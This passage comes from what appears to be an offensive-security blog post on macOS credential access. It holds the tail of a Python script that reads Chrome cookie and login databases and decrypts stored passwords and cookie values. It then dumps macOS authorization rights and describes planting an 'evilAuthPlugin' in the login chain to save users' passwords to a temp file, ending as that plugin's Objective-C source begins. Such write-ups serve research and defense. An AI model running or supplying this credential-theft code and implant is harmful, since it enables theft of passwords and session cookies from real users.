</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;- </span><span style="color:#f1fa8c">{</span>table[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#6272a4"># Print schema for each table</span>
</span></span><span style="display:flex;"><span>                cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;PRAGMA table_info(</span><span style="color:#f1fa8c">{</span>table[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">)&#34;</span>)
</span></span><span style="display:flex;"><span>                columns <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;  Columns:&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> column <span style="color:#ff79c6">in</span> columns:
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;    </span><span style="color:#f1fa8c">{</span>column[<span style="color:#bd93f9">1</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> (</span><span style="color:#f1fa8c">{</span>column[<span style="color:#bd93f9">2</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">)&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;No tables found in the database.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> sqlite3<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;SQLite error: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;An unexpected error occurred: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">finally</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> conn:
</span></span><span style="display:flex;"><span>            conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> cookie_path <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#34;&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(cookie_file)
</span></span><span style="display:flex;"><span>        cursor <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Check if the &#39;cookies&#39; table exists</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT name FROM sqlite_master WHERE type=&#39;table&#39; AND name=&#39;cookies&#39;;&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> cursor<span style="color:#ff79c6">.</span>fetchone() <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: The &#39;cookies&#39; table doesn&#39;t exist in the database: </span><span style="color:#f1fa8c">{</span>cookie_file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Available tables:&#34;</span>)
</span></span><span style="display:flex;"><span>            cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT name FROM sqlite_master WHERE type=&#39;table&#39;;&#34;</span>)
</span></span><span style="display:flex;"><span>            tables <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">for</span> table <span style="color:#ff79c6">in</span> tables:
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(table[<span style="color:#bd93f9">0</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            sql <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;select name, value, encrypted_value, path, host_key, expires_utc, is_httponly, samesite, is_secure, priority, last_access_utc, is_persistent, has_expires, source_scheme from cookies&#39;</span>
</span></span><span style="display:flex;"><span>            cookies <span style="color:#ff79c6">=</span> {}
</span></span><span style="display:flex;"><span>            cookies_list <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> k, v, ev, path, domain, expirationDate, httpOnly, samesite, secure, priority, last_access, is_persistent, has_expires, source_scheme <span style="color:#ff79c6">in</span> conn<span style="color:#ff79c6">.</span>execute(sql):
</span></span><span style="display:flex;"><span>                    temp_val <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;name&#34;</span>: k, <span style="color:#f1fa8c">&#34;value&#34;</span>: v, <span style="color:#f1fa8c">&#34;path&#34;</span>: path, <span style="color:#f1fa8c">&#34;domain&#34;</span>: domain, <span style="color:#f1fa8c">&#34;expirationDate&#34;</span>: expirationDate, <span style="color:#f1fa8c">&#34;httpOnly&#34;</span>: httpOnly, <span style="color:#f1fa8c">&#34;samesite&#34;</span>: samesite, <span style="color:#f1fa8c">&#34;secure&#34;</span>: secure, <span style="color:#f1fa8c">&#34;id&#34;</span>: priority, <span style="color:#f1fa8c">&#34;session&#34;</span>: is_persistent, <span style="color:#f1fa8c">&#34;hostOnly&#34;</span>: <span style="color:#ff79c6">False</span>, <span style="color:#f1fa8c">&#34;storeId&#34;</span>:<span style="color:#f1fa8c">&#34;firefox-default&#34;</span>, <span style="color:#f1fa8c">&#34;sameSite&#34;</span>:<span style="color:#f1fa8c">&#34;no_restriction&#34;</span>,<span style="color:#f1fa8c">&#34;firstPartyDomain&#34;</span>:<span style="color:#f1fa8c">&#34;&#34;</span>}
</span></span><span style="display:flex;"><span>                    temp_val[<span style="color:#f1fa8c">&#34;httpOnly&#34;</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span> <span style="color:#ff79c6">if</span> httpOnly <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>                    temp_val[<span style="color:#f1fa8c">&#34;secure&#34;</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span> <span style="color:#ff79c6">if</span> secure <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>                    temp_val[<span style="color:#f1fa8c">&#34;session&#34;</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">not</span> <span style="color:#8be9fd;font-style:italic">bool</span>(is_persistent)
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span> v <span style="color:#ff79c6">or</span> (ev[:<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;v10&#39;</span>):
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">pass</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>                        temp_val[<span style="color:#f1fa8c">&#39;value&#39;</span>] <span style="color:#ff79c6">=</span> chrome_decrypt(ev, key<span style="color:#ff79c6">=</span>key)
</span></span><span style="display:flex;"><span>                    cookies_list<span style="color:#ff79c6">.</span>append(temp_val)
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(json<span style="color:#ff79c6">.</span>dumps(cookies_list, sort_keys<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>, indent<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">except</span> sqlite3<span style="color:#ff79c6">.</span>OperationalError <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error executing SQL: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Columns in the &#39;cookies&#39; table:&#34;</span>)
</span></span><span style="display:flex;"><span>                cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;PRAGMA table_info(cookies);&#34;</span>)
</span></span><span style="display:flex;"><span>                columns <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> column <span style="color:#ff79c6">in</span> columns:
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>(column[<span style="color:#bd93f9">1</span>])  <span style="color:#6272a4"># Print column name</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> sqlite3<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;SQLite error: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;An unexpected error occurred: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">finally</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> conn:
</span></span><span style="display:flex;"><span>            conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Cookie path is empty. Please provide a valid path.&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> login_data <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#34;&#34;</span>:
</span></span><span style="display:flex;"><span>    fd <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>open(login_data, os<span style="color:#ff79c6">.</span>O_RDONLY) <span style="color:#6272a4">#open as read only</span>
</span></span><span style="display:flex;"><span>    database <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(<span style="color:#f1fa8c">&#39;/dev/fd/</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> fd)
</span></span><span style="display:flex;"><span>    os<span style="color:#ff79c6">.</span>close(fd)
</span></span><span style="display:flex;"><span>    sql <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;select username_value, password_value, origin_url from logins&#39;</span>
</span></span><span style="display:flex;"><span>    decryptedList <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> database:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> user, encryptedPass, url <span style="color:#ff79c6">in</span> database<span style="color:#ff79c6">.</span>execute(sql):
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> user <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">or</span> (encryptedPass[:<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;v10&#39;</span>): <span style="color:#6272a4">#user will be empty if they have selected &#34;never&#34; store password</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Working on url: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(url))
</span></span><span style="display:flex;"><span>                urlUserPassDecrypted <span style="color:#ff79c6">=</span> (url, user, chrome_decrypt(encryptedPass, key<span style="color:#ff79c6">=</span>key))
</span></span><span style="display:flex;"><span>                decryptedList<span style="color:#ff79c6">.</span>append(urlUserPassDecrypted)
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(json<span style="color:#ff79c6">.</span>dumps(decryptedList, sort_keys<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>, indent<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    cookie_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Cookies3&#34;</span>  <span style="color:#6272a4"># Update this to the correct path</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Diagnosing database: </span><span style="color:#f1fa8c">{</span>cookie_path<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    diagnose_database(cookie_path)
</span></span></code></pre></div><h1 id="credential-access-via-authorization-plugins">credential access via authorization plugins</h1>
<p>authorization plugins (located in <code>/Library/Security/SecurityAgentPlugins</code>) extend the authentication system in macOS by allowing custom authentication methods to be integrated into the standard login process. <code>securityd</code> works with these plugins to handle authentication requests, by communicating with <code>SecurityAgent</code>, which loads + uses these plugins.</p>
<p>the plugins can implement custom authentication methods (biometric, 3rd-party IdPs) and so must be carefully designed and implemented.</p>
<p>the authorization database (located at <code>/var/db/auth.db</code>) controls all the rules, policies, and plugins that are used when requests are processed via <code>securityd</code>. you can dump the information in this database by providing a &ldquo;right-name&rdquo; (check out the full list <a href="https://www.dssw.co.uk/reference/authorization-rights/"  target="_blank" rel="noreferrer nofollow">here</a>
): <code>security authorizationdb read &lt;right-name&gt;</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ security authorizationdb <span style="color:#8be9fd;font-style:italic">read</span> allow
</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC <span style="color:#f1fa8c">&#34;-//Apple//DTD PLIST 1.0//EN&#34;</span> <span style="color:#f1fa8c">&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;plist <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;class&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;allow&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;comment&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;Allow anyone.&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;created&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;modified&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;version&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;0&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span><span style="display:flex;"><span>YES <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ security authorizationdb <span style="color:#8be9fd;font-style:italic">read</span> authenticate-session-owner-or-admin
</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC <span style="color:#f1fa8c">&#34;-//Apple//DTD PLIST 1.0//EN&#34;</span> <span style="color:#f1fa8c">&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;plist <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;allow-root&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;false/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;authenticate-user&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;true/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;class&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;user&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;comment&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;Authenticate either as the owner or as an administrator.&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;created&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;group&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;admin&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;modified&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;session-owner&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;true/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;shared&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;false/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;timeout&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;2147483647&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;tries&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;10000&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;version&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;0&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span><span style="display:flex;"><span>YES <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>these are known as authorization rights. as you can see, they have a <code>class</code> key that has three possible values: <code>user</code>, <code>rule</code>, <code>evaluate-mechanisms</code>. the latter is a complex series of programmatic checks.</p>
<p>an important right that i&rsquo;ll look at is <code>system.login.console</code>. this controls access to console login on macOS. the <code>loginwindow</code> process tries to obtain this right during the login process, and sysadmins usually modify this right to add custom authC/authZ steps during login. it&rsquo;s structured as a <code>plist</code> containing various keys, and modifying it can yield some pretty powerful effects.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ security authorizationdb <span style="color:#8be9fd;font-style:italic">read</span> system.login.console               
</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC <span style="color:#f1fa8c">&#34;-//Apple//DTD PLIST 1.0//EN&#34;</span> <span style="color:#f1fa8c">&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;plist <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;class&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;evaluate-mechanisms&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;comment&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;Login mechanism based rule.  Not <span style="color:#ff79c6">for</span> general use, yet.&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;created&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;mechanisms&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;array&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:prelogin&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:policy-banner&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:login-begin&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:reset-password,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:FDESupport,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:forward-login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:auto-login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:authenticate,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;PKINITMechanism:auth,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:login-success&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:success&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;HomeDirMechanism:login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;HomeDirMechanism:status&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;MCXMechanism:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;CryptoTokenKit:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:done&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;/array&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;modified&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;shared&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;true/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;tries&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;10000&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;version&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;11&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span><span style="display:flex;"><span>YES <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>the <code>mechanisms</code> array has a format of <code>&lt;plugin&gt;:&lt;mechanism&gt;</code>, and occasionally <code>,privileged</code>, which means it runs as root. all these mechanisms need to return <code>kAuthorizationResultAllow</code>, otherwise the entire process fails. each plugin in this list gets called in order, as well.</p>
<p>the two main components of authorization in macOS are a user-and-owner model from BSD that applies to files + folders, and policy-based authorization requests for greater granularity. appls pass a list of requested rights to the Security Server which compares them against the authorization database. if there&rsquo;s no valid cache entry, users might have to authenticate.</p>
<p>you can track rules + rights requested for certain actions, which is useful to see which rights are needed where.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo log show --style syslog --predicate <span style="color:#f1fa8c">&#39;subsystem == &#34;com.apple.Authorization&#34; &amp;&amp; eventMessage CONTAINS[c] &#34;validating credential&#34;&#39;</span> --last 8h
</span></span><span style="display:flex;"><span>Filtering the log data using <span style="color:#f1fa8c">&#34;subsystem == &#34;</span>com.apple.Authorization<span style="color:#f1fa8c">&#34; AND composedMessage CONTAINS[c] &#34;</span>validating credential<span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Skipping info and debug messages, pass --info and/or --debug to include.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Timestamp                       <span style="color:#ff79c6">(</span>process<span style="color:#ff79c6">)[</span>PID<span style="color:#ff79c6">]</span>    
</span></span><span style="display:flex;"><span>2024-10-10 09:21:47.878819-0400  localhost authd<span style="color:#ff79c6">[</span>445<span style="color:#ff79c6">]</span>: <span style="color:#ff79c6">[</span>com.apple.Authorization:authd<span style="color:#ff79c6">]</span> Validating credential bilal <span style="color:#ff79c6">(</span>501<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">for</span> use-login-window-ui <span style="color:#ff79c6">(</span>engine 3299<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>it&rsquo;s becoming increasingly likely that we can install our own authorization plugin into a system. first, i need to dump a copy of the right that i need (<code>system.login.console</code>): <code>security authorizationdb read system.login.console &gt; poc.plist</code>.</p>
<p>since i want to create my own plugin and add it to the list after the user&rsquo;s password is confirmed (by <code>HomeDirMechanism</code> returning <code>true</code>), i&rsquo;ll need to craft some code and use the functions <code>AuthorizationRightGet</code> and <code>AuthorizationRightSet</code>. modifying the code taken from <a href="https://github.com/alex030/UserConfigAgent/blob/42e3d786d52604b3cfbcdf8c77320093684626d7/UserConfigAgentPlugin/main.m"  target="_blank" rel="noreferrer nofollow">here</a>
 (which is a UserConfigAgent program written in Objective-C), it should allow us to create an implant that will store the user&rsquo;s password when they log back in.</p>
<p>this is the <code>main.m</code> function of the <code>evilAuthPlugin</code> <a href="https://github.com/xorrior/macOSTools/tree/master/auth_plugins/evilAuthPlugin"  target="_blank" rel="noreferrer nofollow">program</a>
. you can modify the <code>MechanismInvoke()</code> function to perform any action, but for now it just saves the user&rsquo;s password to <code>/private/tmp/password.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objc" data-lang="objc"><span style="display:flex;"><span><span style="color:#ff79c6">#import &lt;Foundation/Foundation.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#import &lt;Security/AuthorizationPlugin.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;Security/AuthSession.h&gt;</span><span style="color:#ff79c6">
